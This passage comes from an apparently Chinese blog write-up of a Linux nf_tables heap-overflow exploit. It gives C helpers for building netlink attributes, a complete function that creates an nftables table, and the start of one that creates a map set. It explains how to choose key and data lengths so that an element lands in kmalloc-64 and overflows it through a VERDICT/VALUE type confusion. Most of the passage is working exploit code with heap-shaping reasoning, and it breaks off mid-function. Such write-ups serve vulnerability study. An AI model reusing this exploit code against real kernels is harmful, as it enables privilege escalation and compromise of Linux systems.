</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> * @value: Value of this attribute
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> */</span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>struct</span> nlattr <span style=color:#666>*</span><span style=color:#06287e>set_u64_attr</span>(<span style=color:#007020;font-weight:700>struct</span> nlattr <span style=color:#666>*</span>attr, <span style=color:#902000>uint16_t</span> type, <span style=color:#902000>uint64_t</span> value) {
</span></span><span style=display:flex><span>    attr<span style=color:#666>-&gt;</span>nla_type <span style=color:#666>=</span> type;
</span></span><span style=display:flex><span>    attr<span style=color:#666>-&gt;</span>nla_len <span style=color:#666>=</span> U64_NLA_SIZE;
</span></span><span style=display:flex><span>    <span style=color:#666>*</span>(<span style=color:#902000>uint64_t</span> <span style=color:#666>*</span>)<span style=color:#06287e>NLA_ATTR</span>(attr) <span style=color:#666>=</span> <span style=color:#06287e>htobe64</span>(value);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>return</span> (<span style=color:#902000>void</span> <span style=color:#666>*</span>)attr <span style=color:#666>+</span> U64_NLA_SIZE;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>/**
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> * set_str8_attr(): Prepare a 8 bytes long string netlink attribute
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> * @attr: Attribute to fill
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> * @type: Type of the attribute
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> * @name: Buffer to copy into the attribute
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> */</span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>struct</span> nlattr <span style=color:#666>*</span><span style=color:#06287e>set_str8_attr</span>(<span style=color:#007020;font-weight:700>struct</span> nlattr <span style=color:#666>*</span>attr, <span style=color:#902000>uint16_t</span> type, <span style=color:#007020;font-weight:700>const</span> <span style=color:#902000>char</span> name[<span style=color:#40a070>8</span>]) {
</span></span><span style=display:flex><span>    attr<span style=color:#666>-&gt;</span>nla_type <span style=color:#666>=</span> type;
</span></span><span style=display:flex><span>    attr<span style=color:#666>-&gt;</span>nla_len <span style=color:#666>=</span> S8_NLA_SIZE;
</span></span><span style=display:flex><span>    <span style=color:#06287e>memcpy</span>(<span style=color:#06287e>NLA_ATTR</span>(attr), name, <span style=color:#40a070>8</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>return</span> (<span style=color:#902000>void</span> <span style=color:#666>*</span>)attr <span style=color:#666>+</span> S8_NLA_SIZE;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>/**
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> * set_binary_attr(): Prepare a byte array netlink attribute
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> * @attr: Attribute to fill
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> * @type: Type of the attribute
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> * @buffer: Buffer with data to send
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> * @buffer_size: Size of the previous buffer
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> */</span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>struct</span> nlattr <span style=color:#666>*</span><span style=color:#06287e>set_binary_attr</span>(<span style=color:#007020;font-weight:700>struct</span> nlattr <span style=color:#666>*</span>attr, <span style=color:#902000>uint16_t</span> type, <span style=color:#902000>uint8_t</span> <span style=color:#666>*</span>buffer, <span style=color:#902000>uint64_t</span> buffer_size) {
</span></span><span style=display:flex><span>    attr<span style=color:#666>-&gt;</span>nla_type <span style=color:#666>=</span> type;
</span></span><span style=display:flex><span>    attr<span style=color:#666>-&gt;</span>nla_len <span style=color:#666>=</span> <span style=color:#06287e>NLA_BIN_SIZE</span>(buffer_size);
</span></span><span style=display:flex><span>    <span style=color:#06287e>memcpy</span>(<span style=color:#06287e>NLA_ATTR</span>(attr), buffer, buffer_size);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>return</span> (<span style=color:#902000>void</span> <span style=color:#666>*</span>)attr <span style=color:#666>+</span> <span style=color:#06287e>NLA_ALIGN</span>(<span style=color:#06287e>NLA_BIN_SIZE</span>(buffer_size));
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>关于这里的 <code>set_str8_attr</code> 这个函数，要注意的一点是，在内核中，比较 string 类型的属性和字符串时，使用 nla_strcmp</p><p><a id=code-snippet--nla-strcmp></a></p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>/**
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> * nla_strcmp - Compare a string attribute against a string
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> * @nla: netlink string attribute
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> * @str: another string
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> */</span>
</span></span><span style=display:flex><span><span style=color:#902000>int</span> <span style=color:#06287e>nla_strcmp</span>(<span style=color:#007020;font-weight:700>const</span> <span style=color:#007020;font-weight:700>struct</span> nlattr <span style=color:#666>*</span>nla, <span style=color:#007020;font-weight:700>const</span> <span style=color:#902000>char</span> <span style=color:#666>*</span>str)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>        <span style=color:#902000>int</span> len <span style=color:#666>=</span> <span style=color:#06287e>strlen</span>(str);
</span></span><span style=display:flex><span>        <span style=color:#902000>char</span> <span style=color:#666>*</span>buf <span style=color:#666>=</span> <span style=color:#06287e>nla_data</span>(nla);
</span></span><span style=display:flex><span>        <span style=color:#902000>int</span> attrlen <span style=color:#666>=</span> <span style=color:#06287e>nla_len</span>(nla);
</span></span><span style=display:flex><span>        <span style=color:#902000>int</span> d;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>if</span> (attrlen <span style=color:#666>&gt;</span> <span style=color:#40a070>0</span> <span style=color:#666>&amp;&amp;</span> buf[attrlen <span style=color:#666>-</span> <span style=color:#40a070>1</span>] <span style=color:#666>==</span> <span style=color:#4070a0>&#39;\0&#39;</span>)
</span></span><span style=display:flex><span>                attrlen<span style=color:#666>--</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        d <span style=color:#666>=</span> attrlen <span style=color:#666>-</span> len;
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>if</span> (d <span style=color:#666>==</span> <span style=color:#40a070>0</span>)
</span></span><span style=display:flex><span>                d <span style=color:#666>=</span> <span style=color:#06287e>memcmp</span>(<span style=color:#06287e>nla_data</span>(nla), str, len);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>return</span> d;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#06287e>EXPORT_SYMBOL</span>(nla_strcmp);
</span></span></code></pre></div><p>这里在比较前会先比较两个字符串的长度，对于 nla 的长度使用的是 <code>nla_len</code> 而不是 <code>strlen</code> ，所以在使用 <code>set_str8_attr</code> 是，传入的字符串长度最好是 7 或者 8 ，否则之后如果碰到需要 <code>nla_strcmp</code> 操作时，就会直接无法通过。</p><p>这些 helper 都是向一个 nlattr 中写入数据，然后返回下一个 nlattr 的地址。在<a href=#nlattr> <code>nlattr</code> </a>这里有说到，对于传入的 nlattr 是“序列化表示”，所以下一个 nlattr 的地址就是当前 nlattr 的末尾。有了这些 helper 我们来看如何设置一个 create table 的 nlattr 以起到和使用命令行工具 nft</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>nft add table inet TABLEAAA
</span></span></code></pre></div><p>一样的效果。</p><p>首先我们申请出一个合适的 nlmsg 大小</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#007020>#define TABLEMSG_SIZE NLMSG_SPACE(sizeof(struct nfgenmsg) + S8_NLA_SIZE)
</span></span></span><span style=display:flex><span><span style=color:#007020></span><span style=color:#007020;font-weight:700>struct</span> nlmsghdr <span style=color:#666>*</span>nlh_payload <span style=color:#666>=</span> (<span style=color:#007020;font-weight:700>struct</span> nlmsghdr <span style=color:#666>*</span>)<span style=color:#06287e>malloc</span>(TABLEMSG_SIZE);
</span></span></code></pre></div><p>对于创建 table ，我们只要在 nlattr 中指定 table 的名字即可，所以大小就是 <code>NLMSG_SPACE(sizeof(struct nfgenmsg) + S8_NLA_SIZE)</code> 。然后设置该 header 的各个字段</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#06287e>memset</span>(nlh_payload, <span style=color:#40a070>0</span>, <span style=color:#007020;font-weight:700>sizeof</span>(<span style=color:#666>*</span>nlh_payload));
</span></span><span style=display:flex><span>nlh_payload<span style=color:#666>-&gt;</span>nlmsg_flags <span style=color:#666>=</span> NLM_F_REQUEST;
</span></span><span style=display:flex><span>nlh_payload<span style=color:#666>-&gt;</span>nlmsg_len <span style=color:#666>=</span> TABLEMSG_SIZE;
</span></span><span style=display:flex><span>nlh_payload<span style=color:#666>-&gt;</span>nlmsg_pid <span style=color:#666>=</span> <span style=color:#06287e>getpid</span>();
</span></span><span style=display:flex><span>nlh_payload<span style=color:#666>-&gt;</span>nlmsg_seq <span style=color:#666>=</span> <span style=color:#40a070>0</span>;
</span></span><span style=display:flex><span>nlh_payload<span style=color:#666>-&gt;</span>nlmsg_type <span style=color:#666>=</span> (NFNL_SUBSYS_NFTABLES <span style=color:#666>&lt;&lt;</span> <span style=color:#40a070>8</span>) <span style=color:#666>|</span> NFT_MSG_NEWTABLE;
</span></span></code></pre></div><p>这里主要要注意的就是要设置 nlmsg_type 中的低 16 位，用以表示这是一个 <code>NFT_MSG_NEWTABLE</code> 操作。然后要在 <code>nlmsg_flags</code> 中设置 <code>NLM_F_REQUEST</code> ，内核的代码中会检查这个标志位。</p><p>同样的我们也要设置其 <code>nfgenmsg</code></p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#007020;font-weight:700>struct</span> nfgenmsg <span style=color:#666>*</span>nfgm <span style=color:#666>=</span> <span style=color:#06287e>NLMSG_DATA</span>(nlh_payload);
</span></span><span style=display:flex><span>nfgm<span style=color:#666>-&gt;</span>nfgen_family <span style=color:#666>=</span> NFPROTO_INET;
</span></span></code></pre></div><p>只是为了利用的话这里的 family 其实可以随便设置，只要和之后 create set 的时候一致即可。这个 <code>NFPROTO_INET</code> 就对应</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>nft add table inet TABLEAAA
</span></span></code></pre></div><p>中的 inet 。</p><p>然后我们设置 nlattr</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>nla <span style=color:#666>=</span> (<span style=color:#902000>void</span> <span style=color:#666>*</span>)nlh_payload <span style=color:#666>+</span> <span style=color:#06287e>NLMSG_SPACE</span>(<span style=color:#007020;font-weight:700>sizeof</span>(<span style=color:#007020;font-weight:700>struct</span> nfgenmsg));
</span></span><span style=display:flex><span><span style=color:#06287e>set_str8_attr</span>(nla, <span style=color:#4070a0>&#34;TABLEAAA&#34;</span>, name);
</span></span></code></pre></div><p>有了 helper ，这个还是比较简单的。</p><p>完整的创建 table 的函数如下</p><p><a id=code-snippet--create-nft-table></a></p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#902000>void</span> <span style=color:#06287e>create_nft_table</span>(<span style=color:#902000>int</span> nlsock, <span style=color:#007020;font-weight:700>const</span> <span style=color:#902000>char</span> <span style=color:#666>*</span>name) {
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>struct</span> sockaddr_nl dest_nl;
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>struct</span> msghdr msg;
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>struct</span> nlmsghdr <span style=color:#666>*</span>nlh_batch_begin;
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>struct</span> nlmsghdr <span style=color:#666>*</span>nlh_payload;
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>struct</span> nlmsghdr <span style=color:#666>*</span>nlh_batch_end;
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>struct</span> nfgenmsg <span style=color:#666>*</span>nfgm;
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>struct</span> nlattr <span style=color:#666>*</span>nla;
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>struct</span> iovec iov[<span style=color:#40a070>3</span>];
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#06287e>memset</span>(<span style=color:#666>&amp;</span>dest_nl, <span style=color:#40a070>0</span>, <span style=color:#007020;font-weight:700>sizeof</span>(dest_nl));
</span></span><span style=display:flex><span>  dest_nl.nl_family <span style=color:#666>=</span> AF_NETLINK;
</span></span><span style=display:flex><span>  <span style=color:#06287e>memset</span>(<span style=color:#666>&amp;</span>msg, <span style=color:#40a070>0</span>, <span style=color:#007020;font-weight:700>sizeof</span>(msg));
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  nlh_batch_begin <span style=color:#666>=</span> <span style=color:#06287e>make_bacth_begin_nlmsghdr</span>();
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#60a0b0;font-style:italic>// create a table message
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  nlh_payload <span style=color:#666>=</span> (<span style=color:#007020;font-weight:700>struct</span> nlmsghdr <span style=color:#666>*</span>)<span style=color:#06287e>malloc</span>(TABLEMSG_SIZE);
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>if</span> (nlh_payload <span style=color:#666>==</span> <span style=color:#007020>NULL</span>) {
</span></span><span style=display:flex><span>    <span style=color:#06287e>fprintf</span>(stderr, <span style=color:#4070a0>&#34;[-] malloc</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#06287e>exit</span>(<span style=color:#40a070>1</span>);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#06287e>memset</span>(nlh_payload, <span style=color:#40a070>0</span>, <span style=color:#007020;font-weight:700>sizeof</span>(<span style=color:#666>*</span>nlh_payload));
</span></span><span style=display:flex><span>  nlh_payload<span style=color:#666>-&gt;</span>nlmsg_flags <span style=color:#666>=</span> NLM_F_REQUEST;
</span></span><span style=display:flex><span>  nlh_payload<span style=color:#666>-&gt;</span>nlmsg_len <span style=color:#666>=</span> TABLEMSG_SIZE;
</span></span><span style=display:flex><span>  nlh_payload<span style=color:#666>-&gt;</span>nlmsg_pid <span style=color:#666>=</span> <span style=color:#06287e>getpid</span>();
</span></span><span style=display:flex><span>  nlh_payload<span style=color:#666>-&gt;</span>nlmsg_seq <span style=color:#666>=</span> <span style=color:#40a070>0</span>;
</span></span><span style=display:flex><span>  nlh_payload<span style=color:#666>-&gt;</span>nlmsg_type <span style=color:#666>=</span> (NFNL_SUBSYS_NFTABLES <span style=color:#666>&lt;&lt;</span> <span style=color:#40a070>8</span>) <span style=color:#666>|</span> NFT_MSG_NEWTABLE;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  nfgm <span style=color:#666>=</span> <span style=color:#06287e>NLMSG_DATA</span>(nlh_payload);
</span></span><span style=display:flex><span>  nfgm<span style=color:#666>-&gt;</span>nfgen_family <span style=color:#666>=</span> NFPROTO_INET;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  nla <span style=color:#666>=</span> (<span style=color:#902000>void</span> <span style=color:#666>*</span>)nlh_payload <span style=color:#666>+</span> <span style=color:#06287e>NLMSG_SPACE</span>(<span style=color:#007020;font-weight:700>sizeof</span>(<span style=color:#007020;font-weight:700>struct</span> nfgenmsg));
</span></span><span style=display:flex><span>  <span style=color:#06287e>set_str8_attr</span>(nla, NFTA_TABLE_NAME, name);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  nlh_batch_end <span style=color:#666>=</span> <span style=color:#06287e>make_bacth_end_nlmsghdr</span>();
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#60a0b0;font-style:italic>// put theme into iovec
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  <span style=color:#06287e>memset</span>(iov, <span style=color:#40a070>0</span>, <span style=color:#007020;font-weight:700>sizeof</span>(iov));
</span></span><span style=display:flex><span>  iov[<span style=color:#40a070>0</span>].iov_base <span style=color:#666>=</span> nlh_batch_begin;
</span></span><span style=display:flex><span>  iov[<span style=color:#40a070>0</span>].iov_len <span style=color:#666>=</span> nlh_batch_begin<span style=color:#666>-&gt;</span>nlmsg_len;
</span></span><span style=display:flex><span>  iov[<span style=color:#40a070>1</span>].iov_base <span style=color:#666>=</span> nlh_payload;
</span></span><span style=display:flex><span>  iov[<span style=color:#40a070>1</span>].iov_len <span style=color:#666>=</span> nlh_payload<span style=color:#666>-&gt;</span>nlmsg_len;
</span></span><span style=display:flex><span>  iov[<span style=color:#40a070>2</span>].iov_base <span style=color:#666>=</span> nlh_batch_end;
</span></span><span style=display:flex><span>  iov[<span style=color:#40a070>2</span>].iov_len <span style=color:#666>=</span> nlh_batch_end<span style=color:#666>-&gt;</span>nlmsg_len;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  msg.msg_name <span style=color:#666>=</span> <span style=color:#666>&amp;</span>dest_nl;
</span></span><span style=display:flex><span>  msg.msg_namelen <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>sizeof</span>(dest_nl);
</span></span><span style=display:flex><span>  msg.msg_iov <span style=color:#666>=</span> iov;
</span></span><span style=display:flex><span>  msg.msg_iovlen <span style=color:#666>=</span> <span style=color:#40a070>3</span>;
</span></span><span style=display:flex><span>  <span style=color:#902000>int</span> nbytes;
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>if</span> ((nbytes <span style=color:#666>=</span> <span style=color:#06287e>sendmsg</span>(nlsock, <span style=color:#666>&amp;</span>msg, <span style=color:#40a070>0</span>)) <span style=color:#666>&lt;=</span> <span style=color:#40a070>0</span>) {
</span></span><span style=display:flex><span>    <span style=color:#06287e>perror</span>(<span style=color:#4070a0>&#34;[-] sendmsg(create table)&#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#06287e>close</span>(nlsock);
</span></span><span style=display:flex><span>    <span style=color:#06287e>exit</span>(<span style=color:#40a070>1</span>);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#06287e>printf</span>(<span style=color:#4070a0>&#34;[!] %d bytes sent</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>, nbytes);
</span></span><span style=display:flex><span>  <span style=color:#06287e>perror</span>(<span style=color:#4070a0>&#34;    sendmsg&#34;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#06287e>free</span>(nlh_batch_begin);
</span></span><span style=display:flex><span>  <span style=color:#06287e>free</span>(nlh_payload);
</span></span><span style=display:flex><span>  <span style=color:#06287e>free</span>(nlh_batch_end);
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><h3 id=cache-选择><span class=section-num>5.3</span> cache 选择</h3><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>elem <span style=color:#666>=</span> <span style=color:#06287e>kzalloc</span>(set<span style=color:#666>-&gt;</span>ops<span style=color:#666>-&gt;</span>elemsize <span style=color:#666>+</span> tmpl<span style=color:#666>-&gt;</span>len, gfp);
</span></span></code></pre></div><p>溢出的堆块如上被分配，gfp 是传入的参数，为 <code>GFP_KERNEL</code> ， <code>tmpl->len</code> 由我们控制， <code>set->ops->elemsize</code> 不可控，但是并不大，最后我们可以申请到的将是 <code>kmalloc-{64,96,128,192}</code></p><p>首先，我们选择构造 <code>NFT_SET_MAP</code> 类型的 set （似乎在使用 nft 时，他被叫成 map 了 <a href=https://wiki.nftables.org/wiki-nftables/index.php/Maps>wiki map</a>），创建这个类型是因为需要填充一些数据凑到能够溢出。为了创建一个 set 我们需要为一个 <code>NFT_MSG_GETSET</code> 构造多个 <code>nlattr</code></p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>nla <span style=color:#666>=</span> <span style=color:#06287e>set_str8_attr</span>(nla, NFTA_SET_TABLE, table_name); <span style=color:#60a0b0;font-style:italic>// table the set belong
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>nla <span style=color:#666>=</span> <span style=color:#06287e>set_str8_attr</span>(nla, NFTA_SET_NAME, set_name); <span style=color:#60a0b0;font-style:italic>// set name
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>nla <span style=color:#666>=</span> <span style=color:#06287e>set_u32_attr</span>(nla, NFTA_SET_ID, id); <span style=color:#60a0b0;font-style:italic>// id of the table (seems can be random..)
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>nla <span style=color:#666>=</span> <span style=color:#06287e>set_u32_attr</span>(nla, NFTA_SET_KEY_LEN, key_len); <span style=color:#60a0b0;font-style:italic>// key len (as this is a map set)
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>nla <span style=color:#666>=</span> <span style=color:#06287e>set_u32_attr</span>(nla, NFTA_SET_DATA_LEN, set_data_len); <span style=color:#60a0b0;font-style:italic>// data len
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>nla <span style=color:#666>=</span> <span style=color:#06287e>set_u32_attr</span>(nla, NFTA_SET_DATA_TYPE, <span style=color:#40a070>0</span>); <span style=color:#60a0b0;font-style:italic>// data type (we don&#39;t care)
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>nla <span style=color:#666>=</span> <span style=color:#06287e>set_u32_attr</span>(nla, NFTA_SET_FLAGS, NFT_SET_MAP); <span style=color:#60a0b0;font-style:italic>// set type
</span></span></span></code></pre></div><p>每项的意义都在注释里写明了，比较重要的是 KEY_LEN 和 DATA_LEN 两个字段，分别决定了我们能不能占位到 kmalloc-64 上和能不能有效的实现堆溢出，在通过 <code>nf_tables_newset</code> 函数新建 set 时，他们会设置 set 的 <code>klen</code> 和 <code>dlen</code> 两个字段</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>set<span style=color:#666>-&gt;</span>klen  <span style=color:#666>=</span> desc.klen;
</span></span><span style=display:flex><span>set<span style=color:#666>-&gt;</span>dlen  <span style=color:#666>=</span> desc.dlen;
</span></span></code></pre></div><p>而两者又会一起更新漏洞函数 <code>nft_set_elem_init</code> 使用的 <code>struct nft_set_ext_tmpl tmpl</code> 的 <code>len</code> 字段用以申请内存。</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#06287e>nft_set_ext_add_length</span>(<span style=color:#666>&amp;</span>tmpl, NFT_SET_EXT_KEY, set<span style=color:#666>-&gt;</span>klen);
</span></span><span style=display:flex><span><span style=color:#06287e>nft_set_ext_add_length</span>(<span style=color:#666>&amp;</span>tmpl, NFT_SET_EXT_DATA, desc.len);
</span></span></code></pre></div><p>不过未来我们添加元素时不会带上别的 nlattr ，所以 <code>tmpl->len</code> 也不会被别的属性更新。</p><p>然后 tmpl 会被 <code>nft_set_ext_prepare</code> 初始化</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#007020;font-weight:700>static</span> <span style=color:#007020;font-weight:700>inline</span> <span style=color:#902000>void</span> <span style=color:#06287e>nft_set_ext_prepare</span>(<span style=color:#007020;font-weight:700>struct</span> nft_set_ext_tmpl <span style=color:#666>*</span>tmpl)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>        <span style=color:#06287e>memset</span>(tmpl, <span style=color:#40a070>0</span>, <span style=color:#007020;font-weight:700>sizeof</span>(<span style=color:#666>*</span>tmpl));
</span></span><span style=display:flex><span>        tmpl<span style=color:#666>-&gt;</span>len <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>sizeof</span>(<span style=color:#007020;font-weight:700>struct</span> nft_set_ext);
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p><code>len</code> 会被初始化为 10 。</p><p>kzalloc 时如下：</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>elem <span style=color:#666>=</span> <span style=color:#06287e>kzalloc</span>(set<span style=color:#666>-&gt;</span>ops<span style=color:#666>-&gt;</span>elemsize <span style=color:#666>+</span> tmpl<span style=color:#666>-&gt;</span>len, gfp);
</span></span></code></pre></div><p><code>elemsize</code> 由 ops 决定，由于我们申请的是 <code>NFT_SET_MAP</code> ，所以 ops 会是 <code>nft_set_rhash_type</code> ，其 <code>elemsize</code> 为 8</p><p>所以如果我们想要申请到 kmalloc-64 ，只要满足 <code>key_len + data_len = 64 - 8 - 12</code> 即可（这里减去 12 而不是 sizeof(nft_set_ext) 的 10 的原因是在 <code>nft_set_ext_add_length</code> 中会把 <code>len</code> 对齐）。</p><p>考虑到在溢出时，我们使用一个 VERDICT 类型来混淆 VALUE 类型，所以届时 desc.len 将会是 <code>sizeof(struct nft_verdict) = 16</code> 。由此我们可以得出 key_len 须为 <code>64 - 8 - 12 - 16</code> 。对于创建 set 时的 data_len ，我们只要让他大于 16 就可以实现溢出，想要溢出多少字节就比 16 大多少就行了</p><p>如下为完整的创建 set 的代码</p><p><a id=code-snippet--create-nft-set></a></p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#902000>void</span> <span style=color:#06287e>create_nft_set</span>(<span style=color:#902000>int</span> nlsock, <span style=color:#007020;font-weight:700>const</span> <span style=color:#902000>char</span> <span style=color:#666>*</span>set_name, <span style=color:#902000>uint32_t</span> set_key_len,
</span></span><span style=display:flex><span>                    <span style=color:#902000>uint32_t</span> set_data_len, <span style=color:#007020;font-weight:700>const</span> <span style=color:#902000>char</span> <span style=color:#666>*</span>table_name,
</span></span><span style=display:flex><span>                    <span style=color:#902000>uint32_t</span> id) {
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>struct</span> msghdr msg;
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>struct</span> sockaddr_nl dest_nl;
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>struct</span> nlmsghdr <span style=color:#666>*</span>nlh_batch_begin;
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>struct</span> nlmsghdr <span style=color:#666>*</span>nlh_payload;
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>struct</span> nlmsghdr <span style=color:#666>*</span>nlh_batch_end;
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>struct</span> nfgenmsg <span style=color:#666>*</span>nfgm;
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>struct</span> nlattr <span style=color:#666>*</span>nla;
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>struct</span> iovec iov[<span style=color:#40a070>3</span>];
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#06287e>memset</span>(<span style=color:#666>&amp;</span>dest_nl, <span style=color:#40a070>0</span>, <span style=color:#007020;font-weight:700>sizeof</span>(dest_nl));
</span></span><span style=display:flex><span>  dest_nl.nl_family <span style=color:#666>=</span> AF_NETLINK;
</span></span><span style=display:flex><span>  <span style=color:#06287e>memset</span>(<span style=color:#666>&amp;</span>msg, <span style=color:#40a070>0</span>, <span style=color:#007020;font-weight:700>sizeof</span>(msg));
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  nlh_batch_begin <span style=color:#666>=</span> <span style=color:#06287e>make_bacth_begin_nlmsghdr</span>();
</span></span><span style=display:flex><span>  nlh_batch_end <span style=color:#666>=</span> <span style=color:#06287e>make_bacth_end_nlmsghdr</span>();
</span></span><span style=display:flex><span>
